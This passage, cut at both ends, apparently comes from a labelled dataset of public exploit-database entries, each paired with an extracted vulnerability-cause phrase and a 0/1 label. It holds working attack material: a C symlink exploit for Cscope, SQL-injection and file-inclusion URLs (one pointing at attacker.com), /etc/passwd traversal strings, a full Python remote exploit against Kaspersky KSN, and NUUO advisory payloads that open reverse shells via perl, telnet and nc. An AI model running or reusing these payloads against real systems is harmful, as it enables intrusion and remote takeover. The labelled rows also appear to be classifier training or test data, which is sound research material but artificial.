do_vfs_ioctl+0x134/0x8f0 [...] [   69.926807]  ksys_ioctl+0x70/0x80 [   69.927709]  __x64_sys_ioctl+0x3d/0x50 [   69.928734]  do_syscall_64+0x73/0x160 [   69.929741]  entry_SYSCALL_64_after_hwframe+0x44/0xa9 [   69.931099] RIP: 0033:0x7f6491542dd7 [   69.932068] Code: 00 00 00 48 8b 05 c1 80 2b 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 80 2b 00 f7 d8 64 89 01 48 [   69.937051] RSP: 002b:00007f6491460f28 EFLAGS: 00000206 ORIG_RAX: 0000000000000010 [   69.939067] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f6491542dd7 [   69.940977] RDX: 000000000000000f RSI: 0000000000005301 RDI: 0000000000000004 [   69.942905] RBP: 00007f6491460f50 R08: 0000000000000000 R09: 0000000000000018 [   69.944800] R10: 0000000000000064 R11: 0000000000000206 R12: 0000000000000000 [   69.947600] R13: 00007ffeb17a9b4f R14: 0000000000000000 R15: 00007f6491c42040 [   69.949491]  [   69.949923] Allocated by task 1131: [   69.950866]  __kasan_kmalloc.constprop.8+0xa5/0xd0 [   69.952147]  kmem_cache_alloc_trace+0xfa/0x200 [   69.953352]  r3964_ioctl+0x2e6/0x3c0 [   69.954333]  tty_ioctl+0x227/0xbd0 [   69.955267]  do_vfs_ioctl+0x134/0x8f0 [   69.956248]  ksys_ioctl+0x70/0x80 [   69.957150]  __x64_sys_ioctl+0x3d/0x50 [   69.958169]  do_syscall_64+0x73/0x160 [   69.959148]  entry_SYSCALL_64_after_hwframe+0x44/0xa9 [   69.960485]  [   69.960910] Freed by task 1131: [   69.961764]  __kasan_slab_free+0x135/0x180 [   69.962851]  kfree+0x90/0x1d0 [   69.963660]  r3964_ioctl+0x208/0x3c0 [   69.964631]  tty_ioctl+0x227/0xbd0 [   69.965564]  do_vfs_ioctl+0x134/0x8f0 [   69.966540]  ksys_ioctl+0x70/0x80 [   69.967424]  __x64_sys_ioctl+0x3d/0x50 [   69.968424]  do_syscall_64+0x73/0x160 [   69.969414]  entry_SYSCALL_64_after_hwframe+0x44/0xa9 [   69.970768]  [   69.971182] The buggy address belongs to the object at ffff8881e0474008 [   69.971182]  which belongs to the cache kmalloc-64 of size 64 [   69.974429] The buggy address is located 24 bytes inside of [   69.974429]  64-byte region [ffff8881e0474008, ffff8881e0474048) [   69.977470] The buggy address belongs to the page: [   69.978744] page:ffffea0007811d00 count:1 mapcount:0 mapping:ffff8881e600f740 index:0x0 compound_mapcount: 0 [   69.981316] flags: 0x17fffc000010200(slab|head) [   69.982528] raw: 017fffc000010200 ffffea0007554508 ffffea0007811e08 ffff8881e600f740 [   69.984722] raw: 0000000000000000 0000000000270027 00000001ffffffff 0000000000000000 [   69.984723] page dumped because: kasan: bad access detected [   69.984724]  [   69.984725] Memory state around the buggy address: [   69.984727]  ffff8881e0473f00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [   69.984729]  ffff8881e0473f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [   69.984731] >ffff8881e0474000: fc fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc [   69.984732]                                ^ [   69.984734]  ffff8881e0474080: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [   69.984736]  ffff8881e0474100: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc [   69.984737] ================================================================== [   69.984739] Disabling lock debugging due to kernel taint [   69.996233] ================================================================== ==================================   I wonder whether it would, in addition to fixing the locking, also make sense to gate the line discipline on some sort of capability - it seems wrong to me that this kind of code is exposed to every user on the system. */",kernel taint,0
24750,"Cscope 13.0/15.x - Insecure Temporary File Creation (2) // source: https://www.securityfocus.com/bid/11697/info   Cscope creates temporary files in an insecure way. A design error causes the application to fail to verify the presence of a file before writing to it.   During execution, the utility reportedly creates temporary files in the system's temporary directory, '/tmp', with predictable names. This allows attackers to create malicious symbolic links that Cscope will write to when an unsuspecting user executes it.   Attackers may leverage these issues to overwrite arbitrary files with the privileges of an unsuspecting user that activates the vulnerable application.   Versions up to and including Cscope 15.5 are reported vulnerable. /* RXcscope exploit version 15.5 and minor */ #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h>  #define BSIZE   64  int main(int ac, char *av[]) {         pid_t cur;         u_int i=0, lst;         char buffer[BSIZE + 1];          fprintf(stdout, ""\n     --[ Cscope Exploit ]--\n""\                         ""     version 15.5 and minor \n"" \                         ""       Gangstuck / Psirac\n"" \                         ""     <research@rexotec.com>\n\n"");          if (ac != 3) {                 fprintf(stderr, ""Usage: %s <target> <max file creation>\n"", av[0]);                 return 1;         }          cur=getpid();         lst=cur+atoi(av[2]);          fprintf(stdout, "" -> Current process id is ..... [%5d]\n"" \                         "" -> Last process id is ........ [%5d]\n"", cur, lst);          while (++cur != lst) {                 snprintf(buffer, BSIZE, ""%s/cscope%d.%d"", P_tmpdir, cur, (i==2) ? --i : ++i);                 symlink(av[1], buffer);         }          return 0; }",A design error causes the application to fail to verify the presence of a file before writing to it,1
21543,"Ruslan Communications <Body>Builder - Authentication Bypass source: https://www.securityfocus.com/bid/5008/info  Ruslan Communications <Body>Builder is a tool designed to assist a user in creating a website. It allows for remote administration through a web interface, and is implemented in Java.  Reportedly, user input supplied as the login password is not adequately filtered. A malicious user may include special characters in the supplied password and modify the SQL query used to validate the user. Access to the administrative interface is possible.   Use login='-- and pass='--",user input supplied as the login password is not adequately filtered,1
31784,phpMyAgenda 2.1 - 'infoevent.php3' Remote File Inclusion source: https://www.securityfocus.com/bid/29164/info  PhpMyAgenda is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  PhpMyAgenda 2.1 is vulnerable; other versions may also be affected.   http://www.example.com/[PaTh]/infoevent.php3?rootagenda=[EV!L],fails to sufficiently sanitize user-supplied data,1
20663,"WhitSoft SlimServe ftpd 1.0/2.0 - Directory Traversal source: https://www.securityfocus.com/bid/2452/info  SlimServ FTPd is a free ftp server distributed and maintained by WhitSoft Development. SlimServe FTPd is designed to offer ftp services to the Microsoft Windows platform.  A problem with the SlimSoft FTP daemon allows remote users to traverse directories outside of the ftp root. Due to the insufficient checking of input, it is possible for a user to escape the ftp root directory by using relative paths. By requesting a directory change of ""..."" (three dots), it is possible to gain access to the root directory of the partition the ftp server is running on, and potentially gain access to sensitive system files.  Therefore, it is possible for a remote malicious user to gain access to sensitive system files, and potentially gain elevated privileges or privileged information.  % ftp localhost Connected to xxxxxxxxxx.rh.rit.edu. 220-SlimServe FTPd 1.0 :: www.whitsoftdev.com. 220 127.0.0.1 connected to xxxxxxxxxx.rh.rit.edu. User (xxxxxxxxxx.rh.rit.edu:(none)): anonymous 230 User anonymous logged in, proceed. ftp> cd ... 250 CWD command successful. ftp> get autoexec.bat 200 PORT command successful. 150 Opening data connection for ""/.../autoexec.bat"". 250 RETR command successful. ftp: 383 bytes received in 0.16Seconds 2.39Kbytes/sec. ftp>","the insufficient checking of input,",1
29192,"Clickblog - 'Displaycalendar.asp' SQL Injection source: https://www.securityfocus.com/bid/21310/info  Clickblog is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  http://www.example.com/displayCalendar.asp?date=[SQL Injection]",the application fails to properly sanitize user-supplied input before using it in an SQL query,1
22672,"Cafelog b2 0.6 - Remote File Inclusion source: https://www.securityfocus.com/bid/7738/info  A remote file include vulnerability has been reported for Cafelog. Due to insufficient sanitization of some user-supplied variables by the 'blogger-2-b2.php' and 'gm-2-b2.php' scripts, it is possible for a remote attacker to include a malicious PHP file in a URL.  If the remote file is a malicious PHP script, this may allow for execution of attacker-supplied PHP code with the privileges of the web server.   http://blabla.com/b2-tools/gm-2-b2.php?b2inc=http://attacker.com",insufficient sanitization of some user-supplied variables,1
31217,BanPro Dms 1.0 - 'index.php' Local File Inclusion source: https://www.securityfocus.com/bid/27831/info  BanPro DMS is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability using directory-traversal strings to include local files in the context of the webserver process. This may allow the attacker to obtain potentially sensitive information; other attacks are also possible.  This issue affects BanPro DMS 1.0; other versions may also be vulnerable.  http://www.example.com/DMS/index.php?action=../../../../../../../../../../etc/passwd%00,fails to properly sanitize user-supplied input,1
28305,Ajax Chat 0.1 - 'operator_chattranscript.php?chatid' Traversal Arbitrary File Access source: https://www.securityfocus.com/bid/19238/info  AJAX Chat is prone to both a directory-traversal vulnerability and a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.   An attacker can exploit the directory-traversal issue to retrieve arbitrary files from the vulnerable system in the context of the affected application. Information obtained may aid in further attacks.  The attacker may also leverage the cross-site scripting issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  These issues affect AJAX Chat 0.1; other versions may also be vulnerable.  http://www.server.com/includes/operator_chattranscript.php?chatid=../../../../../../etc/passwd%00,fails to properly sanitize user-supplied input,1
26723,"Relative Real Estate Systems 1.2 - SQL Injection source: https://www.securityfocus.com/bid/15714/info  Relative Real Estate Systems is prone to an SQL injection vulnerability.  This issue is due to a failure in the application to properly sanitize user-supplied input to the 'index.php' script before using it in an SQL query.  This vulnerability could permit remote attackers to pass malicious input to database queries, resulting in modification of query logic or other attacks.   http://www.example.com/index.php?name=&price_from=&price_to=&city=&state=SC&mls=[SQL]&bathroom=-1&bedrooms=-1&go=search&results=1",a,0
26169,W-Agora 4.2 - 'Site' Directory Traversal source: https://www.securityfocus.com/bid/14597/info  W-Agora is prone to a directory traversal vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An unauthorized user can retrieve arbitrary files by supplying directory traversal strings '../' to the vulnerable parameter. Exploitation of this vulnerability could lead to a loss of confidentiality. Information obtained may aid in further attacks against the underlying system; other attacks are also possible.   http://www.example.com/w-agora/index.php?site=../../../../../../../../boot.ini%00 http://www.example.com/w-agora/index.php?site=../../../../../../../../etc/passwd%00 http://www.example.com/w-agora/index.php?site=../../../../../../../../etc/passwd http://www.example.com/w-agora/index.php?site=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afboot.ini http://www.example.com/w-agora/index.php?site=../../../../../../../../boot.ini,a failure in the application to properly sanitize user-supplied input,1
44521,"Kaspersky KSN for Linux 5.2 - Memory Corruption ''' # Exploit Author: Juan Sacco <jsacco@exploitpack.com> - http://exploitpack.com # # Tested on: Kali i686 GNU/Linux # CVE: NotYet # # Exploit description: # Kaspersky KSN v5.2 is prone to a remote memory corruption because it fails to properly filter the input on the remote subscribers, this leads to heap segments overwrite # and it leads to remote code execution. # # # Program description: # Kaspersky KSN for Linux enables cloud-assisted, multi-layered security for servers and workstations running the Linux operating system. It delivers reliable protection with minimal impact on # performance. # Product homepage: http://kaspersky.com # # Example usage: python kaspersky.py 192.168.1.1 6349 # # [!] Valgrind output: # # =3314== Invalid write of size 4 # ==3314==    at 0x24FA74: RespObject::SetSimpleString(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) (in /usr/local/ksn/bin/rocksdb-server) # ==3314==    by 0x241814: RequestParser::Parse(unsigned char*, unsigned long, std::function<void (RespObject const&)>) (in /usr/local/ksn/bin/rocksdb-server) # ==3314==    by 0x23B740: Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp, boost::asio::stream_socket_service<boost::asio::ip::tcp> > >::HandleRead(boost::system::error_code const&, unsigned long) (in /usr/local/ksn/bin/rocksdb-server) # ==3314==    by 0x22FF56: boost::asio::detail::reactive_socket_recv_op<boost::asio::mutable_buffers_1, boost::_bi::bind_t<void, boost::_mfi::mf2<void, Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp, boost::asio::stream_socket_service<boost::asio::ip::tcp> > >, boost::system::error_code const&, unsigned long>, boost::_bi::list3<boost::_bi::value<Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp, boost::asio::stream_socket_service<boost::asio::ip::tcp> > >*>, boost::arg<1> (*)(), boost::arg<2> (*)()> > >::do_complete(boost::asio::detail::task_io_service*, boost::asio::detail::task_io_service_operation*, boost::system::error_code const&, unsigned long) (in /usr/local/ksn/bin/rocksdb-server) # ==3314==    by 0x23647C: boost::asio::detail::task_io_service::run(boost::system::error_code&) (in /usr/local/ksn/bin/rocksdb-server) # ==3314==    by 0x1E978A: main (in /usr/local/ksn/bin/rocksdb-server) # ==3314==  Address 0x0 is not stack'd, malloc'd or (recently) free'd # ==3314== # ==3314== # ==3314== Process terminating with default action of signal 11 (SIGSEGV): dumping core # ==3314==  Access not within mapped region at address 0x0 # ==3314==    at 0x24FA74: RespObject::SetSimpleString(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) (in /usr/local/ksn/bin/rocksdb-server) # ==3314==    by 0x241814: RequestParser::Parse(unsigned char*, unsigned long, std::function<void (RespObject const&)>) (in /usr/local/ksn/bin/rocksdb-server) # ==3314==    by 0x23B740: Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp, boost::asio::stream_socket_service<boost::asio::ip::tcp> > >::HandleRead(boost::system::error_code const&, unsigned long) (in /usr/local/ksn/bin/rocksdb-server) # ==3314==    by 0x22FF56: boost::asio::detail::reactive_socket_recv_op<boost::asio::mutable_buffers_1, boost::_bi::bind_t<void, boost::_mfi::mf2<void, Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp, boost::asio::stream_socket_service<boost::asio::ip::tcp> > >, boost::system::error_code const&, unsigned long>, boost::_bi::list3<boost::_bi::value<Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp, boost::asio::stream_socket_service<boost::asio::ip::tcp> > >*>, boost::arg<1> (*)(), boost::arg<2> (*)()> > >::do_complete(boost::asio::detail::task_io_service*, boost::asio::detail::task_io_service_operation*, boost::system::error_code const&, unsigned long) (in /usr/local/ksn/bin/rocksdb-server) # ==3314==    by 0x23647C: boost::asio::detail::task_io_service::run(boost::system::error_code&) (in /usr/local/ksn/bin/rocksdb-server) # ==3314==    by 0x1E978A: main (in /usr/local/ksn/bin/rocksdb-server) # ==3314==  If you believe this happened as a result of a stack # ==3314==  overflow in your program's main thread (unlikely but # ==3314==  possible), you can try to increase the size of the # ==3314==  main thread stack using the --main-stacksize= flag. # ==3314==  The main thread stack size used in this run was 8388608. # ==3314== # ==3314== HEAP SUMMARY: # ==3314==     in use at exit: 769,426 bytes in 7,522 blocks # ==3314==   total heap usage: 15,342 allocs, 7,820 frees, 1,354,534 bytes allocated # ==3314== # ==3314== LEAK SUMMARY: # ==3314==    definitely lost: 8 bytes in 1 blocks # ==3314==    indirectly lost: 0 bytes in 0 blocks # ==3314==      possibly lost: 5,328 bytes in 9 blocks # ==3314==    still reachable: 764,090 bytes in 7,512 blocks # ==3314==                       of which reachable via heuristic: # ==3314==                         newarray           : 8,264 bytes in 4 blocks # ==3314==         suppressed: 0 bytes in 0 blocks # # [!] Debugger output: # # [----------------------------------registers-----------------------------------] # RAX: 0x7ffe127426f0 --> 0x7ffe12742800 --> 0x7f7ee28fb1c0 --> 0x7f7ee1d4f090 --> 0x7f7ee1894760 (<_ZN5boost4asio6detail15task_io_serviceD2Ev>:  push   r13) # RBX: 0x0 # RCX: 0x7f7ee2913000 --> 0x0 # RDX: 0xffffffffffdf6bf0 # RSI: 0x7ffe127426e0 --> 0x7ffe127426f0 --> 0x7ffe12742800 --> 0x7f7ee28fb1c0 --> 0x7f7ee1d4f090 --> 0x7f7ee1894760 (<_ZN5boost4asio6detail15task_io_serviceD2Ev>:       push   r13) # RDI: 0x0 # RBP: 0x7f7ee28f5338 --> 0x81 # RSP: 0x7ffe127425c0 --> 0x7f7ee2924198 --> 0x7f7ee28f5320 --> 0x5 # RIP: 0x7f7ee18b3a74 (<_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+4>:       mov    DWORD PTR [rdi],0x1) # R8 : 0x0 # R9 : 0x7 # R10: 0x2 # R11: 0x7f7ee00276d0 --> 0xfffcdfc0fffcd800 # R12: 0x29b # R13: 0x0 # R14: 0x7ffe127426e0 --> 0x7ffe127426f0 --> 0x7ffe12742800 --> 0x7f7ee28fb1c0 --> 0x7f7ee1d4f090 --> 0x7f7ee1894760 (<_ZN5boost4asio6detail15task_io_serviceD2Ev>:       push   r13) # R15: 0x7f7ee2924562 --> 0x543ffb3c7ef1cd2b # EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow) # [-------------------------------------code-------------------------------------] #    0x7f7ee18b3a6e:      xchg   ax,ax #    0x7f7ee18b3a70 <_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE>:    push   rbx #    0x7f7ee18b3a71 <_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+1>:  mov    rbx,rdi # => 0x7f7ee18b3a74 <_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+4>:  mov    DWORD PTR [rdi],0x1 #    0x7f7ee18b3a7a <_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+10>: lea    rdi,[rdi+0x10] #    0x7f7ee18b3a7e <_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+14>: call   0x7f7ee184a8a0 <_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE9_M_assignERKS4_@plt> #    0x7f7ee18b3a83 <_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+19>: mov    BYTE PTR [rbx+0x4],0x0 #    0x7f7ee18b3a87 <_ZN10RespObject15SetSimpleStringERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+23>: pop    rbx # [------------------------------------stack-------------------------------------] # 0000| 0x7ffe127425c0 --> 0x7f7ee2924198 --> 0x7f7ee28f5320 --> 0x5 # 0008| 0x7ffe127425c8 --> 0x7f7ee18a5815 (<_ZN13RequestParser5ParseEPhmSt8functionIFvRK10RespObjectEE+3317>:  mov    rdi,QWORD PTR [rsp+0x110]) # 0016| 0x7ffe127425d0 --> 0x7f7ee2901c08 --> 0x5a849d1562a512bd # 0024| 0x7ffe127425d8 --> 0x7f7ee29242c8 --> 0x10061030045 # 0032| 0x7ffe127425e0 --> 0x361 # 0040| 0x7ffe127425e8 --> 0x0 # 0048| 0x7ffe127425f0 --> 0x7ffe127426e0 --> 0x7ffe127426f0 --> 0x7ffe12742800 --> 0x7f7ee28fb1c0 --> 0x7f7ee1d4f090 (--> ...) # 0056| 0x7ffe127425f8 --> 0x7ffe127426a0 --> 0x0 # [------------------------------------------------------------------------------] # Legend: code, data, rodata, value # Stopped reason: SIGSEGV # 0x00007f7ee18b3a74 in RespObject::SetSimpleString(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) () # gdb-peda$ where # #0  0x00007f7ee18b3a74 in RespObject::SetSimpleString(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) () # #1  0x00007f7ee18a5815 in RequestParser::Parse(unsigned char*, unsigned long, std::function<void (RespObject const&)>) () # #2  0x00007f7ee189f741 in Session<boost::asio::basic_stream_socket<boost::asio::ip::tcp, boost::asio::stream_socket_service<boost::asio::ip::tcp> > >::HandleRead(boost::system::error_code const&, unsigned long '''  import binascii import sys import socket import time  def rocksDB(target,port):     try:         while 1:             # Open socket             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)             # Set reuse ON             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)             # Bind port             s.connect((target, port))             print(""["" + time.strftime('%a %H:%M:%S') + ""]"" + "" - "" + ""Connected to:""), target, port             print(""["" + time.strftime('%a %H:%M:%S') + ""]"" + "" - "" + ""Establishing connection.. "")             packet = binascii.unhexlify(b'4500036100010000400679947f0000017f000001001419100000000000000000500220009e1700005ce528736b32895950f96218411ca66c9b0842c995eacbfc3eacd8187d3aa8488e1cf1f18491606b9c400c42ec88e7399baa7c3b0bca43de853c74d2fbb2c08c9868ad9688b815d6e5a913937ff05217e18ff28d379fa6985204f7f529990a675d2fc70e1a7dbca8334e4faf30ea31cb33f0c1fabbfc92fbaf20d7e63cfe65ee95711a80a406c26b6e60335d74a02b42a454bc6bbcf5153cb20b77c9686b2fff994b224a3dc5fcbd12a562159d845a8b039abf971bb7c79fe74ca7055560c9c513377881b7a033eb797738fc119758f4c6ea1a960cab1299f5b1a6e99e0be889d8bdf05edc7ca6f14a48d35a5f747887e2330a5cc8b722257ecf32987ad1e24aa56c4685fdae028ca7689bdb66b3d951b8021a34a04114f4208c3f9a6d66bcb7cbeec80a716d69375a88202f3cac2562c9595095c61e693080edd5a3318084d974a2130d5cfe439903d6d5b9b3b553143831c6e01f286da4a2339c91cfce00fe17d7584153ab93e723ce2e859d7aaa9f9574af2dbb4ca4d9f8c8f39f4e89a790e5e4e74bbfd44a721594362f1c71cc48721014f451b837aff64624ea8fbc767c50ada655f23c87195b49b854c3e0d69f1585b663a02ad33cfdfd78c43e3531d6802b7271b7518ded3d93338084ca0e7982dc7c76d82c1b0fed91e5dc567262f46e3bd71b66f9d8283784d666a2be99e397a4abe9495168c880d7f371b87f44b38e61d836ccad8afc8c99518fa1240ab5a2a0685a9d450f4b44fefcc6b64ce8f6ec836922670b31ebf62ea5933e272a62ac8ff2c79d8f15a1220a37e5535ec0998aaf8af2f9d0a0f75e96fad8e8b1ae0e2fff70d831c501048644f700527d61d1f6cb177948e0ebea8d4a01fa9c7ca2c4b3472bcdf17e3cfb3f54fb791a43f114514b6821390d2c16e23ff9ffb0b0caa508b2952b0a497a24ce0d8ad05734111034a71d57a624855b95594b7f158903f03c02213c8de27644a2026de0c7477f1550f9f39450718ddf185eb9c5f9fc7b545c838970c4f7e87b69c570a873d8f64fe08ed23c7b8275f8bf54f080508bb244fbf3dc852968bd8a63a8787c8e496508c597ae9f617bfb096bebf94cbb736a6438163f61479816da9d88e2a3ea6b50a828d9c2c6f51f34e29f4fe588a41e5e3a53515d474a5a52b357')             # Log the packet in hexa and timestamp             fileLog = target + "".log""             logPacket = open(""exploit.log"", ""w+"")             logPacket.write(""[""+time.strftime('%a %H:%M:%S')+""]""+ "" - Writing to socket: "" + binascii.hexlify(bytes(packet))+""\n"")             logPacket.close()              # Write bytecodes to socket             print(""[""+time.strftime('%a %H:%M:%S')+""]""+"" - ""+""Writing to socket: "")             s.send(bytes(packet))             # Packet sent:             print(bytes(packet))             try:                 data = s.recv(4096)                 print(""["" + time.strftime('%a %H:%M:%S') + ""]"" + "" - ""+ ""Data received: '{msg}'"".format(msg=data))             except socket.error, e:                 print '[!] Sorry, No data available'                 continue         s.close()     except socket.error as error:         print error         print ""Sorry, something went wrong!""  def howtouse():     print ""Usage: kaspersky.py hostname port""     print ""[*] Mandatory arguments:""     print ""[-] Specify a hostname / port""     sys.exit(-1)  if __name__ == ""__main__"":     try:         # Set target         target = sys.argv[1]         port = int(sys.argv[2])          print ""[*] Kaspersky KSN 0-Day by Juan Sacco <jsacco@exploitpack.com>""         rocksDB(target, port)     except IndexError:         howtouse()",fails to properly filter the input on the remote subscribers,1
40200,"NUUO NVRmini2 / NVRsolo / Crystal Devices / NETGEAR ReadyNAS Surveillance Application - Multiple Vulnerabilities >> Multiple vulnerabilities in NUUO NVRmini2 / NVRsolo / Crystal devices and NETGEAR ReadyNAS Surveillance application >> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security (http://www.agileinfosec.co.uk/) ========================================================================== Disclosure: 04/08/2016 / Last updated: 04/08/2016   >> Background on the affected products: ""NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS functionality. Setup is simple and easy, with automatic port forwarding settings built in. NVRmini 2 supports POS integration, making this the perfect solution for small retail chain stores. NVRmini 2 also comes full equipped as a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping and RAID functions for data protection. Choose NVR and know that your valuable video data is safe, always."" ""NVRsolo is NUUO’s answer to hassle free, lightweight NVR system. It is small in size yet able to handle heavy duty tasks. With local HDMI/VGA display and keyboard/mouse input built right into the unit, configuring NVRsolo is easy and simple. Built on solid Linux foundation, we sacrificed nothing except unnecessary bulk to make NVRsolo the award winning standalone NVR solution you have been looking for. NVRsolo's flexibility doesn't end there. For those needing more storage options, we offer 8 bay versions to meet your needs."" ""NUUO Crystal™ is the product that represents the next stage in VMS evolution. Rock solid, easily manageable, with powerful recording and viewing options available. Featuring revolutionary modular system structure that is made to handle large project size, NUUO Crystal™ is the ideal choice for your enterprise. Featuring technology that focuses on delivering stable video recording performance, recording failover, and 3rd party integration choice, you will be impressed with the stability and flexible options with NUUO Crystal™."" ""(ReadyNAS Surveillance) NETGEAR combines leading storage and switching solutions together with sophisticated network video recording software to provide an affordable and easy to install and manage surveillance solution. Small businesses and corporate branch offices require a secure way to protect physical assets, but may lack deep security expertise or a big budget. A user-friendly NVR system should combine fast and flexible configuration with easy operation. With a few simple steps for installation, the web-based management leads users to configure, monitor and playback video everywhere. UPnP search, auto camera detection and GUI schedule save setting-up time, while the easy drag and drop camera, auto scan, preset point patrolling, and multiple views offer users a prime monitoring experience.""   >> Summary: NUUO is a vendor of Network Video Recording (NVR) systems for surveillance cameras. These NVR are Linux embedded video recording systems that can manage a number of cameras and are used worldwide by public institutions, banks, SME's, etc. They also provide a software package to NETGEAR that adds network video recording and monitoring capabilities to the well known NETGEAR ReadyNAS Network Attached Storage systems.  The web interface contains a number of critical vulnerabilities that can be abused by unauthenticated attackers. These consist of monitoring backdoors left in the PHP files that are supposed to be used by NUUO's engineers, hardcoded credentials, poorly sanitised input and a buffer overflow which can be abused to achieve code execution on NUUO's devices as root, and on NETGEAR as the admin user.  Although only the NVRmini 2, NVRsolo, Crystal and ReadyNAS Surveillance devices are known to be affected, it is likely that the same code is used in other NUUO devices or even other third party devices (the firmware is littered with references to other devices like NUUO Titan). However this has not been confirmed as it was not possible to access all NUUO and third party devices that might be using the same code.  A special thanks to CERT/CC (https://www.cert.org/) for assistance with disclosing the vulnerabilities to the vendors [1]. Metasploit exploits for #1, #2 and #3 have been released.   >> Technical details: #1 Vulnerability: Improper Input Validation (leading to remote code execution) CVE-2016-5674 Attack Vector: Remote Constraints: None, can be exploited by an unauthenticated attacker Affected products / versions: - NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected) - NUUO NVRsolo, firmware v1.0.0 to 3.0.0 - ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected) - Other NUUO products that share the same web interface might be affected  The web inteface contains a hidden file named __debugging_center_utils___.php that improperly sanitises input to the log parameter, which is passed to the PHP system() call (snippet below):  function print_file($file_fullpath_name) {     $cmd = ""cat "" . $file_fullpath_name;     echo $file_fullpath_name . ""\n\n"";     system($cmd); }  <?php     if (isset($_GET['log']) && !empty($_GET['log']))     {         $file_fullpath_name = constant('LOG_FILE_FOLDER') . '/' . basename($_GET['log']);         print_file($file_fullpath_name);     }     else     {         die(""unknown command."");     } ?>  The file can be accessed by an unauthenticated user, and code execution can be achieved with the following proofs of concept: - ReadyNAS Surveillance: GET /__debugging_center_utils___.php?log=something%3bperl+-MIO%3a%3aSocket+-e+'$p%3dfork%3bexit,if($p)%3b$c%3dnew+IO%3a%3aSocket%3a%3aINET(PeerAddr,""192.168.1.204%3a9000"")%3bSTDIN->fdopen($c,r)%3b$~->fdopen($c,w)%3bsystem$_+while<>%3b' This will connect a shell back to 192.168.1.204 on port 9000, running as the ""admin"" user.  - NVRmini 2 and NVRsolo: GET /__debugging_center_utils___.php?log=something%3btelnet+192.168.1.204+9999+|+bash+|+telnet+192.168.1.204+9998  This will connect two shells to 192.168.1.204, one on port 9999 and another on port 9998. To execute commands, echo into the 9999 shell, and receive the output on the 9998 shell. Commands will run as the root user.   #2 Vulnerability: Improper Input Validation (leading to remote code execution) CVE-2016-5675 Attack Vector: Remote Constraints: Requires an administrator account Affected products / versions: - NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected) - NUUO NVRsolo, firmware v1.0.0 to 3.0.0 - NUUO Crystal, firmware v2.2.1 to v3.2.0 (older firmware versions might be affected) - ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected) - Other NUUO products that share the same web interface might be affected  The handle_daylightsaving.php page does not sanitise input from the NTPServer parameter correctly and passes it to a PHP system() command (code snippet below):     else if ($act == 'update')     {         $cmd = sprintf(""/usr/bin/ntpdate %s"", $_GET['NTPServer']);                  $find_str = ""time server"";                  $sys_msg = system($cmd);         $pos = strpos($sys_msg, $find_str);  The file can only be accessed by an authenticted user. - ReadyNAS Surveillance: GET /handle_daylightsaving.php?act=update&NTPServer=bla%3b+whoami+>+/tmp/test This will create a /tmp/test file with the contents of ""admin"" (current user).  - NVRmini 2 and NVRsolo: GET /handle_daylightsaving.php?act=update&NTPServer=bla%3brm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.1.204+9000+>/tmp/f Connects a shell to 